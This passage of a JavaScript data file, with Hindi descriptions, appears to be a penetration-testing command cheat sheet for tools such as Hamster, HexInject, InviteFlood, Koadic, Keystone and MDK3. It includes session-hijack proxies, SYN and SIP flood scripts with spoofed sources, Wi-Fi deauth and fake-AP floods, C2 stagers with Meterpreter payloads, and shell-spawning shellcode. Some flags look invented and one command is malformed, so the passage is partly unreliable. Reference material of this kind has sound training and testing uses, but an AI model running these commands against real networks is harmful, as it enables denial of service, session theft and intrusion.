      { cmd: "httrack http://example.com -O ./site -q", desc: "शांत मोड" },
      { cmd: "httrack http://example.com -O . -%r 3 -p 5", desc: "3 गहराई 5 कनेक्शन" }
    ],
    advanced: [
      { cmd: "httrack http://example.com -O /mirror -%r 3 -p 5 -v 2>&1 | tee httrack.log", desc: "पूर्ण मिरर लॉग" },
      { cmd: "httrack http://example.com -O . -%e '-*?*' -%r 2 2>&1 | grep -i 'error\\|done'", desc: "डायनामिक पेज छोड़ें" },
      { cmd: "httrack http://example.com -O ./example && grep -r 'password\\|secret' ./example", desc: "मिरर में सीक्रेट खोजें" },
      { cmd: "for site in $(cat sites.txt); do httrack $site -O mirror_$(echo $site | tr '/' '_'); done", desc: "एकाधिक साइट मिरर" },
      { cmd: "httrack http://example.com -O . -%v -%r 5 2>&1 | awk '/Transferring/{print $3}' | head -20", desc: "ट्रांसफ़र मॉनिटर" }
    ],
    script: "mkdir -p /mirrors/example.com\nhttrack http://example.com -O /mirrors/example.com -%r 3 -p 5 -v 2>&1 | tee /mirrors/example.com/httrack.log\necho 'मिररिंग पूर्ण:' /mirrors/example.com"
  },
  Hamster: {
    install: { pkg: "hamster" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-r <file>", "PCAP फ़ाइल"],
      ["-p <port>", "प्रॉक्सी पोर्ट"],
      ["-v", "वर्बोज़"],
      ["-s", "साइलेंट"],
      ["-d", "डीबग"],
      ["-o <file>", "आउटपुट"],
      ["-c", "कुकी दिखाएँ"],
      ["-h", "सहायता"],
      ["-4", "IPv4"]
    ],
    basic: [
      { cmd: "hamster -i eth0", desc: "सेशन हाइजैक प्रॉक्सी" },
      { cmd: "hamster -r capture.pcap", desc: "PCAP से सेशन पार्स" },
      { cmd: "hamster -p 1234", desc: "पोर्ट 1234 पर प्रॉक्सी" },
      { cmd: "hamster -i eth0 -v", desc: "वर्बोज़ मोड" },
      { cmd: "hamster -i eth0 -c", desc: "कुकी दिखाएँ" },
      { cmd: "hamster -i wlan0", desc: "वायरलेस इंटरफ़ेस" },
      { cmd: "hamster -r http.pcap -o output.txt", desc: "PCAP पार्स और सेव" },
      { cmd: "hamster -i eth0 -s", desc: "साइलेंट मोड" },
      { cmd: "hamster -i eth0 -d", desc: "डीबग मोड" },
      { cmd: "hamster -i eth0 -p 8080", desc: "पोर्ट 8080 पर प्रॉक्सी" }
    ],
    advanced: [
      { cmd: "ferret -i eth0 | hamster -p 1234", desc: "ferret से पाइप" },
      { cmd: "hamster -i eth0 -p 1234 -v 2>&1 | tee hamster.log", desc: "प्रॉक्सी लॉग करें" },
      { cmd: "hamster -r capture.pcap 2>&1 | grep -i 'cookie\\|session'", desc: "सेशन कुकी फ़िल्टर" },
      { cmd: "ferret -i eth0 -o - | hamster -p 1234 & && firefox -no-remote http://localhost:1234", desc: "हाइजैक प्रॉक्सी और ब्राउज़र" },
      { cmd: "hamster -i eth0 -v -c 2>&1 | awk '{print $NF}' | sort -u", desc: "अद्वितीय कुकी वैल्यू" }
    ],
    script: "echo 'सेसन हाइजैक प्रॉक्सी शुरू...'\nferret -i eth0 2>/dev/null | hamster -p 1234 -v 2>&1 | tee /tmp/hamster_$(date +%s).log &"
  },
  HexInject: {
    install: { pkg: "hex-inject" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-s <file>", "पैकेट स्पेक"],
      ["-p <file>", "PCAP फ़ाइल"],
      ["-f <file>", "फ़िल्टर फ़ाइल"],
      ["-d <data>", "हेक्स डेटा"],
      ["-t <type>", "पैकेट प्रकार"],
      ["-c <count>", "पैकेट गिनती"],
      ["-r <rate>", "इंजेक्शन दर"],
      ["-v", "वर्बोज़"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "hexinject -i eth0 -s packet.txt", desc: "पैकेट इंजेक्ट करें" },
      { cmd: "hexinject -i eth0 -d '001122334455' -t raw", desc: "रॉ हेक्स डेटा इंजेक्ट" },
      { cmd: "hexinject -i eth0 -p capture.pcap", desc: "PCAP पैकेट इंजेक्ट" },
      { cmd: "hexinject -i eth0 -f filter.bpf", desc: "BPF फ़िल्टर के साथ" },
      { cmd: "hexinject -i eth0 -c 100 -r 10", desc: "10/सेकंड 100 पैकेट" },
      { cmd: "hexinject -i eth0 -t arp -d 'ffffffffffff00000000000008060001'", desc: "ARP पैकेट इंजेक्ट" },
      { cmd: "hexinject -i eth0 -v", desc: "वर्बोज़ इंजेक्शन" },
      { cmd: "hexinject -i wlan0 -d '0000' -t raw", desc: "वायरलेस पैकेट इंजेक्ट" },
      { cmd: "hexinject -i eth0 -s syn_flood.txt -c 1000", desc: "1000 SYN पैकेट फ़्लड" },
      { cmd: "hexinject -i eth0 -p packets.pcap -v", desc: "PCAP फ़ाइल वर्बोज़ इंजेक्ट" }
    ],
    advanced: [
      { cmd: "hexinject -i eth0 -c 1000 -r 100 -v 2>&1 | tee inject.log", desc: "तेज़ पैकेट इंजेक्शन लॉग" },
      { cmd: "tcpdump -i eth0 -w capture.pcap & hexinject -i eth0 -p inject.pcap", desc: "इंजेक्ट और कैप्चर" },
      { cmd: "python3 -c 'import struct; print(struct.pack(\"!BBHHH\", 69,0,60,0,0).hex())' | xargs hexinject -i eth0 -d", desc: "Python से पैकेट बनाएँ" },
      { cmd: "hexinject -i eth0 -d '4500003c0000400040060000c0a8010ac0a80101' -t raw 2>&1 | grep -v 'sent'", desc: "कस्टम IP पैकेट" },
      { cmd: "for i in $(seq 1 10); do hexinject -i eth0 -d 'ff' -t raw -s; done", desc: "10 पैकेट बर्स्ट" }
    ],
    script: "echo 'पैकेट इंजेक्शन शुरू...'\n# SYN फ़्लड उदाहरण\nfor i in $(seq 1 1000); do\n  hexinject -i eth0 -d '4500003c0000400040060000c0a8010ac0a80101' -t raw 2>/dev/null\ndone\necho 'पैकेट भेजे गए'"
  },
  IKEScan: {
    install: { pkg: "ike-scan" },
    options: [
      ["-M <host>", "लक्ष्य होस्ट"],
      ["-P <port>", "पोर्ट"],
      ["-t <transform>", "ट्रांसफ़ॉर्म"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-o <file>", "आउटपुट"],
      ["-a", "सभी परीक्षण"],
      ["-s <file>", "प्रीशेयर्ड की"],
      ["-n", "Vendor ID दिखाएँ"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "ikescan -M 192.168.1.1", desc: "IKE सर्वर स्कैन" },
      { cmd: "ikescan -M example.com -P 500", desc: "पोर्ट 500 पर स्कैन" },
      { cmd: "ikescan -M 192.168.1.1 -v", desc: "वर्बोज़ IKE स्कैन" },
      { cmd: "ikescan -M 192.168.1.1 -a", desc: "सभी ट्रांसफ़ॉर्म परीक्षण" },
      { cmd: "ikescan -M 192.168.1.1 -o output.txt", desc: "आउटपुट फ़ाइल" },
      { cmd: "ikescan -M 192.168.1.1 -d", desc: "डीबग मोड" },
      { cmd: "ikescan -M 192.168.1.1 -n", desc: "Vendor ID जानकारी" },
      { cmd: "ikescan -M 192.168.1.1 -t 3,1,2", desc: "कस्टम ट्रांसफ़ॉर्म" },
      { cmd: "ikescan -M 192.168.1.1 -s /usr/share/wordlists/psk.txt", desc: "PSK शब्दकोश" },
      { cmd: "ipsec scan 192.168.1.0/24", desc: "सबनेट IKE स्कैन" }
    ],
    advanced: [
      { cmd: "ikescan -M 192.168.1.1 -a -v 2>&1 | tee ikescan.log", desc: "पूर्ण IKE स्कैन लॉग" },
      { cmd: "ikescan -M 192.168.1.1 -v 2>&1 | grep -i 'vendor\\|transform'", desc: "Vendor और ट्रांसफ़ॉर्म जानकारी" },
      { cmd: "for ip in $(seq 1 254); do ikescan -M 192.168.1.$ip -s -t 3; done", desc: "सबनेट IKE स्कैन" },
      { cmd: "nmap -sU -p 500 192.168.1.0/24 -oG - | grep 'open' | awk '{print $2}' | xargs -I{} ikescan -M {}", desc: "nmap से IKE स्कैन पाइप" },
      { cmd: "ikescan -M 192.168.1.1 -a -d 2>&1 | tee /tmp/ike_debug.txt", desc: "डीबग IKE स्कैन" }
    ],
    script: "echo 'IKE स्कैन शुरू...'\nfor ip in $(seq 1 254); do\n  result=$(ikescan -M 192.168.1.$ip -s -t 2 2>/dev/null)\n  [ -n \"$result\" ] && echo \"192.168.1.$ip: $result\" >> ike_results.txt\ndone\necho 'IKE स्कैन पूर्ण'"
  },
  Iaito: {
    install: { pkg: "iaito" },
    options: [
      ["-f <file>", "बाइनरी फ़ाइल"],
      ["-p <port>", "रिमोट पोर्ट"],
      ["-s <host>", "रिमोट होस्ट"],
      ["-d", "डीबग मोड"],
      ["-v", "वर्बोज़"],
      ["-r", "रीड-ओनली"],
      ["-w", "राइट मोड"],
      ["-q", "शांत मोड"],
      ["-h", "सहायता"],
      ["-c <cmd>", "कमांड चलाएँ"]
    ],
    basic: [
      { cmd: "iaito", desc: "Iaito GUI शुरू" },
      { cmd: "iaito -f /bin/ls", desc: "बाइनरी खोलें" },
      { cmd: "iaito -f malware.exe", desc: "Windows बाइनरी खोलें" },
      { cmd: "iaito -d -f /bin/ls", desc: "डीबग मोड" },
      { cmd: "iaito -r -f /bin/bash", desc: "रीड-ओनली मोड" },
      { cmd: "iaito -f core.dump", desc: "कोर डंप विश्लेषण" },
      { cmd: "iaito -f /bin/ls -c 'aaa; afl'", desc: "ऑटो एनालिसिस और फ़ंक्शन सूची" },
      { cmd: "iaito -w -f /bin/ls", desc: "राइट मोड" },
      { cmd: "iaito -v", desc: "वर्बोज़ मोड" },
      { cmd: "iaito -q -f /bin/ls", desc: "शांत मोड" }
    ],
    advanced: [
      { cmd: "iaito -f /bin/ls -c 'aaa; afl~...' 2>&1 | tee iaito_analysis.txt", desc: "एनालिसिस आउटपुट सेव" },
      { cmd: "iaito -f binary -c 'aaa; iz' 2>&1 | grep -i 'password\\|secret'", desc: "बाइनरी में स्ट्रिंग खोजें" },
      { cmd: "iaito -f binary -c 'aaa; afl' 2>&1 | awk '{print $1, $4}'", desc: "फ़ंक्शन एड्रेस और नाम" },
      { cmd: "for f in *.elf; do iaito -q -f $f -c 'aaa; afl' 2>/dev/null | head -5; done > func_summary.txt", desc: "सभी ELF फ़ंक्शन सारांश" },
      { cmd: "iaito -f /bin/ls -c 'aaa; s main; V' 2>&1", desc: "मुख्य फ़ंक्शन ग्राफ़ दृश्य" }
    ],
    script: "echo 'Iaito बैच विश्लेषण...'\nfor f in *.bin; do\n  echo \"=== $f ===\" >> analysis.txt\n  iaito -q -f \"$f\" -c 'aaa; afl~...' 2>/dev/null >> analysis.txt\ndone\necho 'विश्लेषण पूर्ण'"
  },
  InviteFlood: {
    install: { pkg: "invite-flood" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-d <domain>", "डोमेन"],
      ["-u <user>", "यूज़र"],
      ["-s <ip>", "सोर्स IP"],
      ["-t <ip>", "लक्ष्य IP"],
      ["-r <rate>", "पैकेट दर"],
      ["-c <count>", "पैकेट गिनती"],
      ["-v", "वर्बोज़"],
      ["-p <port>", "पोर्ट"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1", desc: "SIP INVITE फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 1000 -t 192.168.1.1 -r 100", desc: "तेज़ INVITE फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 50 -s 10.0.0.1 -t 192.168.1.2", desc: "फ़ेक सोर्स IP फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 500 -t 192.168.1.1 -p 5060", desc: "पोर्ट 5060 पर फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 200 -t 192.168.1.1 -c 5000", desc: "5000 पैकेट फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 50 -t 192.168.1.1 -v", desc: "वर्बोज़ INVITE फ़्लड" },
      { cmd: "inviteflood -i wlan0 -d example.com -u 100 -t 192.168.1.1", desc: "वायरलेस SIP फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 300 -t 192.168.1.1 -r 50", desc: "50 पैकेट/सेकंड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1 -p 5061", desc: "पोर्ट 5061 पर फ़्लड" },
      { cmd: "inviteflood -i eth0 -d example.com -u 999 -t 192.168.1.1 -c 10000", desc: "10000 पैकेट बड़ा फ़्लड" }
    ],
    advanced: [
      { cmd: "inviteflood -i eth0 -d example.com -u 1000 -t 192.168.1.1 -r 500 -v 2>&1 | tee flood.log", desc: "हाई-रेट SIP फ़्लड लॉग" },
      { cmd: "inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1 -s 10.0.0.1 -r 100 &", desc: "बैकग्राउंड फ़्लड" },
      { cmd: "tcpdump -i eth0 -w sip_flood.pcap 'port 5060' & inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1", desc: "SIP फ़्लड कैप्चर" },
      { cmd: "for rate in 10 50 100 500; do inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1 -r $rate -c 1000; done", desc: "रेट एस्केलेशन टेस्ट" },
      { cmd: "inviteflood -i eth0 -d example.com -u 100 -t 192.168.1.1 -v 2>&1 | grep -i 'sent\\|error'", desc: "सेंट/एरर मॉनिटर" }
    ],
    script: "echo 'SIP INVITE फ़्लड शुरू...'\ninviteflood -i eth0 -d example.com -u 500 -t 192.168.1.1 -r 200 -c 10000 -v 2>&1 | tee /tmp/sip_flood.log\necho 'फ़्लड पूर्ण'"
  },
  JDGUI: {
    install: { pkg: "jdgui" },
    options: [
      ["-g", "GUI मोड"],
      ["-t <file>", "JAR फ़ाइल"],
      ["-o <dir>", "आउटपुट डायरेक्टरी"],
      ["-l <file>", "लॉग फ़ाइल"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-c", "CMD मोड"],
      ["-r", "रीकर्सिव"],
      ["-e <encoding>", "एन्कोडिंग"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "jd-gui", desc: "JD-GUI विंडो खोलें" },
      { cmd: "jd-gui app.jar", desc: "JAR फ़ाइल खोलें" },
      { cmd: "jd-gui -g app.jar", desc: "GUI मोड में JAR खोलें" },
      { cmd: "jd-cmd app.jar -o /tmp/decompiled", desc: "हेडलेस JAR डीकंपाइल" },
      { cmd: "jd-cmd -r libs/ -o /output", desc: "रीकर्सिव डीकंपाइल" },
      { cmd: "jd-gui -v app.jar", desc: "वर्बोज़ JAR ओपन" },
      { cmd: "jd-cmd app.jar -o src -s", desc: "साइलेंट डीकंपाइल" },
      { cmd: "jd-gui classes-dex2jar.jar", desc: "Dex2Jar के बाद डीकंपाइल" },
      { cmd: "jd-cmd lib.jar -o /tmp/src -l decompile.log", desc: "लॉग के साथ डीकंपाइल" },
      { cmd: "jd-gui -e UTF-8 app.jar", desc: "UTF-8 एन्कोडिंग" }
    ],
    advanced: [
      { cmd: "jd-cmd -r *.jar -o /tmp/all_src 2>&1 | tee jd_cmd.log", desc: "सभी JAR डीकंपाइल लॉग" },
      { cmd: "jd-cmd app.jar -o /tmp/src -s && grep -r 'password\\|secret\\|api_key' /tmp/src", desc: "डीकंपाइल और सीक्रेट खोज" },
      { cmd: "for f in *.jar; do jd-cmd $f -o src_$(basename $f .jar); done", desc: "एकाधिक JAR डीकंपाइल" },
      { cmd: "jd-cmd -r . -o /tmp/decompiled -s 2>&1 | grep -i 'error\\|success'", desc: "पुनरावर्ती एरर चेक" },
      { cmd: "dex2jar -f classes.dex && jd-gui classes-dex2jar.jar", desc: "dex2jar और jd-gui संयोजन" }
    ],
    script: "mkdir -p /tmp/jar_sources\nfor jar in *.jar; do\n  echo 'डीकंपाइल:' $jar\n  jd-cmd $jar -o /tmp/jar_sources/$(basename $jar .jar) -s 2>/dev/null\ndone\necho 'सभी JAR डीकंपाइल किए गए'"
  },
  JoomScan: {
    install: { pkg: "joom-scan" },
    options: [
      ["-u <url>", "लक्ष्य URL"],
      ["-w <file>", "वर्डलिस्ट"],
      ["-t <threads>", "थ्रेड्स"],
      ["-c <cookie>", "कुकी"],
      ["-x <proxy>", "प्रॉक्सी"],
      ["-o <file>", "आउटपुट"],
      ["-r", "रीकर्सिव"],
      ["-v", "वर्बोज़"],
      ["-q", "शांत"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "joomscan -u http://example.com", desc: "Joomla कमज़ोरी स्कैन" },
      { cmd: "joomscan -u http://example.com -t 10", desc: "10 थ्रेड्स के साथ" },
      { cmd: "joomscan -u http://example.com -w /usr/share/wordlists/joomla.txt", desc: "कस्टम वर्डलिस्ट" },
      { cmd: "joomscan -u http://example.com -c 'PHPSESSID=abc123'", desc: "कुकी के साथ स्कैन" },
      { cmd: "joomscan -u http://example.com -x http://127.0.0.1:8080", desc: "प्रॉक्सी के साथ" },
      { cmd: "joomscan -u http://example.com -o report.txt", desc: "रिपोर्ट सेव करें" },
      { cmd: "joomscan -u http://example.com -r", desc: "रीकर्सिव स्कैन" },
      { cmd: "joomscan -u http://example.com -v", desc: "वर्बोज़ स्कैन" },
      { cmd: "joomscan -u http://example.com -t 20 -o report.html", desc: "HTML रिपोर्ट" },
      { cmd: "joomscan -u http://example.com -q", desc: "शांत मोड स्कैन" }
    ],
    advanced: [
      { cmd: "joomscan -u http://example.com -t 20 -r -v 2>&1 | tee joomla_scan.log", desc: "पूर्ण Joomla स्कैन लॉग" },
      { cmd: "joomscan -u http://example.com -v 2>&1 | grep -i 'vuln\\|found\\|error'", desc: "कमज़ोरियाँ फ़िल्टर" },
      { cmd: "for url in $(cat joomla_sites.txt); do joomscan -u $url -q -o joomla_$(echo $url | md5sum | cut -c1-8).txt; done", desc: "एकाधिक Joomla साइट स्कैन" },
      { cmd: "joomscan -u http://example.com -x http://127.0.0.1:8080 -c 'test=1' -t 10", desc: "प्रॉक्सी और कुकी संयोजन" },
      { cmd: "joomscan -u http://example.com -v 2>&1 | awk '/Version|Component|Module/{print}'", desc: "विशिष्ट जानकारी फ़िल्टर" }
    ],
    script: "echo 'Joomla स्कैन शुरू...'\nwhile read url; do\n  joomscan -u $url -t 10 -r -v -o \"joomla_$(echo $url | sha1sum | cut -c1-8).txt\" 2>/dev/null\ndone < targets.txt\necho 'सभी Joomla साइट स्कैन की गईं'"
  },
  Keystone: {
    install: { pkg: "keystone" },
    options: [
      ["-a <arch>", "आर्किटेक्चर"],
      ["-m <mode>", "मोड"],
      ["-s <asm>", "असेंबली कोड"],
      ["-f <file>", "असेंबली फ़ाइल"],
      ["-o <file>", "आउटपुट फ़ाइल"],
      ["-b", "बाइनरी आउटपुट"],
      ["-c", "C प्रारूप"],
      ["-v", "वर्बोज़"],
      ["-e", "एंडियन"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "kstool x32 'mov eax, 1; ret'", desc: "x86 असेंबल करें" },
      { cmd: "kstool x64 'mov rax, 0x5; ret'", desc: "x64 असेंबल" },
      { cmd: "kstool arm 'mov r0, #1'", desc: "ARM असेंबल" },
      { cmd: "kstool arm64 'mov x0, #1'", desc: "ARM64 असेंबल" },
      { cmd: "kstool x32 'nop; nop; ret' -b -o nops.bin", desc: "NOP बाइनरी बनाएँ" },
      { cmd: "kstool x64 'xor eax, eax; ret' -c", desc: "C प्रारूप आउटपुट" },
      { cmd: "kstool mips 'addiu $sp, $sp, -32'", desc: "MIPS असेंबल" },
      { cmd: "kstool x32 'jmp 0x8048000'", desc: "जंप इंस्ट्रक्शन" },
      { cmd: "kstool thumb 'mov r0, #10'", desc: "ARM Thumb असेंबल" },
      { cmd: "kstool x64 'push rbp; mov rbp, rsp; pop rbp; ret' -v", desc: "वर्बोज़ x64 प्रोलॉग" }
    ],
    advanced: [
      { cmd: "echo 'mov eax, 1; xor ebx, ebx; int 0x80' | kstool x32", desc: "पाइप से असेंबल" },
      { cmd: "kstool x64 'mov rdi, 0x68732f6e69622f; push rdi; mov rdi, rsp; xor esi, esi; xor edx, edx; mov eax, 59; syscall' -c", desc: "शेलकोड C प्रारूप" },
      { cmd: "for arch in x32 x64 arm arm64 mips; do kstool $arch 'nop' -b -o nop_${arch}.bin; done", desc: "सभी आर्क NOP बाइनरी" },
      { cmd: "cat shellcode.asm | kstool x64 -b -o shellcode.bin && xxd -i shellcode.bin", desc: "ASM फ़ाइल असेंबल और xxd" },
      { cmd: "kstool x32 'sub esp, 0x100; mov eax, 0; ret' -v 2>&1 | grep -i 'bytes\\: '", desc: "बाइट्स आउटपुट देखें" }
    ],
    script: "for asm_file in *.asm; do\n  kstool x64 \"$(cat $asm_file)\" -b -o \"$(basename $asm_file .asm).bin\" 2>/dev/null\n  echo \"$(basename $asm_file .asm).bin बनाया गया\"\ndone"
  },
  KeepNote: {
    install: { pkg: "keep-note" },
    options: [
      ["-f <file>", "नोट फ़ाइल"],
      ["-d <dir>", "नोट डायरेक्टरी"],
      ["-n <title>", "नया नोट"],
      ["-e", "एडिटर"],
      ["-s", "सिंपल मोड"],
      ["-v", "वर्बोज़"],
      ["-p", "पोर्टेबल"],
      ["-c", "कंसोल"],
      ["-h", "सहायता"],
      ["--version", "संस्करण"]
    ],
    basic: [
      { cmd: "keepnote", desc: "KeepNote GUI शुरू" },
      { cmd: "keepnote -n 'स्कैन रिपोर्ट'", desc: "नया नोट बनाएँ" },
      { cmd: "keepnote -f /backups/notes.knt", desc: "नोट फ़ाइल खोलें" },
      { cmd: "keepnote -d /home/user/notes", desc: "नोट डायरेक्टरी खोलें" },
      { cmd: "keepnote -s", desc: "सिंपल मोड" },
      { cmd: "keepnote -p", desc: "पोर्टेबल मोड" },
      { cmd: "keepnote -c", desc: "कंसोल मोड" },
      { cmd: "keepnote -e", desc: "एडिटर मोड" },
      { cmd: "keepnote -v", desc: "वर्बोज़ मोड" },
      { cmd: "keepnote -f /home/user/notes.knt -n 'नया प्रोजेक्ट'", desc: "नई फ़ाइल में नोट" }
    ],
    advanced: [
      { cmd: "keepnote -c -n 'nmap स्कैन' -f /scans/scan_$(date +%Y%m%d).knt", desc: "CLI से नया नोट" },
      { cmd: "keepnote -c -n 'पोर्ट स्कैन' < open_ports.txt", desc: "फ़ाइल से नोट इम्पोर्ट" },
      { cmd: "find /home/user/notes -name '*.knt' -exec keepnote -c -f {} \\; 2>&1", desc: "सभी नोट खोलें" },
      { cmd: "keepnote -c -n 'एनुम जानकारी' -d /notes 2>&1 | tee keepnote.log", desc: "एनुम नोट लॉग" },
      { cmd: "keepnote -f /notes/report.knt -n 'भेदन परीक्षण' -e", desc: "एडिटर में नया नोट" }
    ],
    script: "KEEP_DIR=/pentest/notes/$(date +%Y%m%d)\nmkdir -p $KEEP_DIR\nkeepnote -f $KEEP_DIR/pentest.knt -n 'दैनिक रिपोर्ट' 2>/dev/null\necho 'नोट तैयार:' $KEEP_DIR/pentest.knt"
  },
  Koadic: {
    install: { pkg: "koadic" },
    options: [
      ["-s <host>", "सर्वर होस्ट"],
      ["-p <port>", "सर्वर पोर्ट"],
      ["-l <host>", "लिसनर होस्ट"],
      ["-P <port>", "लिसनर पोर्ट"],
      ["-r <file>", "रीसोर्स फ़ाइल"],
      ["-v", "वर्बोज़"],
      ["-d", "डीबग"],
      ["-q", "शांत"],
      ["-c", "कमांड चलाएँ"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "koadic -s 0.0.0.0 -p 9999", desc: "Koadic C2 सर्वर शुरू" },
      { cmd: "koadic -s 0.0.0.0 -p 9999 -l 192.168.1.10 -P 4444", desc: "लिसनर सेट करें" },
      { cmd: "koadic -r /usr/share/koadic/staged.rc", desc: "रीसोर्स फ़ाइल चलाएँ" },
      { cmd: "koadic -s 0.0.0.0 -p 443 -l example.com -P 443", desc: "HTTPS पोर्ट C2" },
      { cmd: "koadic -c 'use stager/js/mshta; set PAYLOAD payload/js/exec'", desc: "स्टेजर कॉन्फ़िगर करें" },
      { cmd: "koadic -s 0.0.0.0 -p 9999 -v", desc: "वर्बोज़ मोड" },
      { cmd: "koadic -s 0.0.0.0 -p 9999 -q", desc: "शांत मोड" },
      { cmd: "koadic -c 'run'", desc: "पेलोड चलाएँ" },
      { cmd: "koadic -s 192.168.1.10 -p 9999 -l 192.168.1.10 -P 4444", desc: "इंटरनल C2" },
      { cmd: "koadic -s 0.0.0.0 -p 9999 -c 'list'", desc: "सत्र सूची देखें" }
    ],
    advanced: [
      { cmd: "koadic -s 0.0.0.0 -p 9999 -l 192.168.1.10 -P 4444 -v 2>&1 | tee koadic.log", desc: "C2 लॉग" },
      { cmd: "koadic -c 'use stager/js/mshta; set PAYLOAD payload/js/exec; set CMD \"powershell -enc ...\"; run'", desc: "MSHTA के साथ C2 स्टेजर" },
      { cmd: "koadic -s 0.0.0.0 -p 9999 -d 2>&1 | grep -i 'session\\|stager'", desc: "सेशन मॉनिटर" },
      { cmd: "echo -e 'use stager/js/mshta\\nset PAYLOAD payload/js/exec\\nrun' | koadic -s 0.0.0.0 -p 9999", desc: "पाइप से C2 कमांड" },
      { cmd: "koadic -c 'use stager/js/mshta; set PAYLOAD payload/js/meterpreter; run' 2>&1", desc: "Meterpreter C2 पेलोड" }
    ],
    script: "echo 'Koadic C2 शुरू...'\nkoadic -s 0.0.0.0 -p 9999 -l 192.168.1.10 -P 4444 -v 2>&1 | tee /tmp/koadic_$(date +%s).log &\nsleep 3\necho 'C2 सर्वर चल रहा है पोर्ट 9999 पर'"
  },
  LBD: {
    install: { pkg: "lbd" },
    options: [
      ["-c", "चेक मोड"],
      ["-d <domain>", "डोमेन"],
      ["-p <port>", "पोर्ट"],
      ["-t <sec>", "टाइमआउट"],
      ["-s", "साइलेंट"],
      ["-v", "वर्बोज़"],
      ["-o <file>", "आउटपुट"],
      ["-4", "IPv4"],
      ["-6", "IPv6"],
      ["-h", "सहायता"]
    ],
    basic: [
      { cmd: "lbd -d example.com", desc: "लोड बैलेंसर डिटेक्ट" },
      { cmd: "lbd -d example.com -c", desc: "पूर्ण जाँच मोड" },
      { cmd: "lbd -d example.com -p 80", desc: "पोर्ट 80 पर जाँच" },
      { cmd: "lbd -d example.com -t 30", desc: "30 सेकंड टाइमआउट" },
      { cmd: "lbd -d example.com -v", desc: "वर्बोज़ मोड" },
      { cmd: "lbd -d example.com -s", desc: "साइलेंट मोड" },
      { cmd: "lbd -d example.com -o report.txt", desc: "रिपोर्ट सेव" },
      { cmd: "lbd -d example.com -p 443", desc: "HTTPS पोर्ट जाँच" },
      { cmd: "lbd -d example.com -4", desc: "IPv4 मोड" },
      { cmd: "lbd -d example.com -6", desc: "IPv6 मोड" }
    ],
    advanced: [
      { cmd: "lbd -d example.com -c -v 2>&1 | tee lbd.log", desc: "पूर्ण LB डिटेक्शन लॉग" },
      { cmd: "for domain in $(cat domains.txt); do lbd -d $domain -s; done > lbd_results.txt", desc: "एकाधिक डोमेन LB जाँच" },
      { cmd: "lbd -d example.com -v 2>&1 | grep -i 'load\\|balance\\|found'", desc: "LB जानकारी फ़िल्टर" },
      { cmd: "lbd -d example.com -p 80 -t 10 -s 2>&1", desc: "10 सेकंड तेज़ जाँच" },
      { cmd: "nmap -sV -p 80,443 example.com && lbd -d example.com", desc: "nmap और lbd संयोजन" }
    ],
    script: "echo 'लोड बैलेंसर जाँच...'\nwhile read domain; do\n  result=$(lbd -d $domain -s 2>/dev/null)\n  echo \"$domain: $result\" >> lbd_report.txt\ndone < domains.txt\necho 'जाँच पूर्ण'"
  },
  MDK3: {
    install: { pkg: "mdk3" },
    options: [
      ["-i <iface>", "इंटरफ़ेस"],
      ["-c <ch>", "चैनल"],
      ["-b <file>", "BSSID फ़ाइल"],
      ["-s <rate>", "पैकेट दर"],
      ["-v", "वर्बोज़"],
      ["-a", "AMOK मोड"],
      ["-m", "माइकल शटडाउन"],
      ["-d", "डीऑथ मोड"],
      ["-e", "बीकन मोड"],
      ["-f", "MAC फ़्लड"]
    ],
    basic: [
      { cmd: "mdk3 wlan0mon -a -b bssids.txt", desc: "AMOK डीऑथ अटैक" },
      { cmd: "mdk3 wlan0mon -d -b bssids.txt", desc: "डीऑथेंटिकेशन फ़्लड" },
      { cmd: "mdk3 wlan0mon -b -c 6", desc: "बीकन फ़्लड" },
      { cmd: "mdk3 wlan0mon -e -c 6 -n TestNet", desc: "फ़ेक AP बीकन" },
      { cmd: "mdk3 wlan0mon -f -c 6", desc: "MAC फ़्लड" },
      { cmd: "mdk3 wlan0mon -m -b bssids.txt", desc: "माइकल शटडाउन" },
      { cmd: "mdk3 wlan0mon -d -b bssids.txt -s 100", desc: "तेज़ डीऑथ फ़्लड" },
      { cmd: "mdk3 wlan0mon -a -b bssids.txt -v", desc: "वर्बोज़ AMOK अटैक" },
      { cmd: "mdk3 wlan0mon -b -c 1", desc: "चैनल 1 बीकन फ़्लड" },
      { cmd: "mdk3 wlan0mon -e -c 11 -n FreeWiFi", desc: "FreeWiFi फ़ेक AP" }
    ],
    advanced: [
      { cmd: "mdk3 wlan0mon -d -b bssids.txt -s 500 -v 2>&1 | tee mdk3.log", desc: "हाई-स्पीड डीऑथ लॉग" },
      { cmd: "mdk3 wlan0mon -a -b bssids.txt && mdk3 wlan0mon -d -b bssids.txt", desc: "AMOK फिर डीऑथ" },
      { cmd: "for ch in 1 6 11; do mdk3 wlan0mon -b -c $ch; done", desc: "सभी चैनल बीकन फ़्लड" },
      { cmd: "airodump-ng wlan0mon -w ap_list && awk '{print $1}' ap_list-01.csv | tail -n +3 > ap.txt && mdk3 wlan0mon -d -b ap.txt", desc: "AP ढूँढें और डीऑथ करें" },
      { cmd: "mdk3 wlan0mon -e -c 6 -n 'Free WiFi' -s 1000 &", desc: "हाई-रेट फ़ेक AP" }
    ],
